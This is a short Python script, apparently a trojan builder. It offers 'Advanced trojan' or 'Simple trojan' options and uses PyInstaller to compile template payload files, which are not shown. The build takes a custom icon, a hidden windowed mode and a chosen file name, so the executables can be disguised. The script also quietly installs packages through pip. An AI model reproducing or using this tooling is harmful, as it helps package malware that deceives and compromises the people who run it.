from print_color import print
import colorama
import os


def clear():
    os.system("cls")
    os.system("clear")

pack = "pip install http flask json pyinstaller urllib"
make = "pyinstaller --onefile "
os.system(pack)
colorama.init()

clear()

banner="""
                                                                                              
 ____      ____  ____      _____         _____          ____            ______       ______   
|    |    |    ||    | ___|\    \   ___|\     \    ____|\   \       ___|\     \  ___|\     \  
|    |    |    ||    ||    |\    \ |    |\     \  /    /\    \     |    |\     \|     \     \ 
|    |    |    ||    ||    | |    ||    | |     ||    |  |    |    |    |/____/||     ,_____/|
|    |    |    ||    ||    |/____/ |    | /_ _ / |    |__|    | ___|    \|   | ||     \--'\_|/
|    |    |    ||    ||    |\    \ |    |\    \  |    .--.    ||    \    \___|/ |     /___/|  
|\    \  /    /||    ||    | |    ||    | |    | |    |  |    ||    |\     \    |     \____|\ 
| \ ___\/___ / ||____||____| |____||____|/____/| |____|  |____||\ ___\|_____|   |____ '     /|
 \ |   ||   | / |    ||    | |    ||    /     || |    |  |    || |    |     |   |    /_____/ |
  \|___||___|/  |____||____| |____||____|_____|/ |____|  |____| \|____|_____|   |____|     | /
    \(    )/      \(    \(     )/    \(    )/      \(      )/      \(    )/       \( |_____|/ 
     '    '        '     '     '      '    '        '      '        '    '         '    )/    
                                                                                        '          
    [ Made By So3r -> github.com/Programmer803 ] # Beta Version
    
    
    
    
"""
print(banner , color="red")




def list_choice():
    
    print("Advanced trojan" , tag="1" , color="green" , tag_color="magenta" , end="\n\n")
    
    print("Simple trojan" , tag="2" , color="green" , tag_color="magenta" , end="\n\n")
    

list_choice()




print("[$[User]$] --> " , color="magenta" , end="")

choise = int(input(""))



def Maker(file , make = make):
    
    make =  make+ f""" "{file}" """

    clear()
        
    print(banner , color="red")
    
    print("Icon Path (Or no icon): ",tag="Icon" , tag_color="red",end="")
    
    
    icon_path = input("")
    
    if icon_path != "":
    
        make = make + f"""--icon "{icon_path}" """

    
    print("Hide or Unhide : ",tag="Hide" , tag_color="red",end="")

    hide_tf = input("")        
    
    if hide_tf == "hide" or hide_tf == "Hide" or hide_tf =="h":
    
        make = make + " --windowed "
        
    else :
        
        make = make + "--console "
        
    print("Name : ",tag="File Name" , tag_color="red",end="")

    name = input("")           
    
    make = make+ f""" --name "{name}"  """
    
    os.system(make)
    
    print(tag="Finish" , tag_color= "red")    
    
    
    
    
    
# **********************************
# **********************************

if choise == 1:
    
    Maker("template/troj_advance.py")
    
elif choise == 2:
    
    Maker("template/simple_met.py")
    

    
    
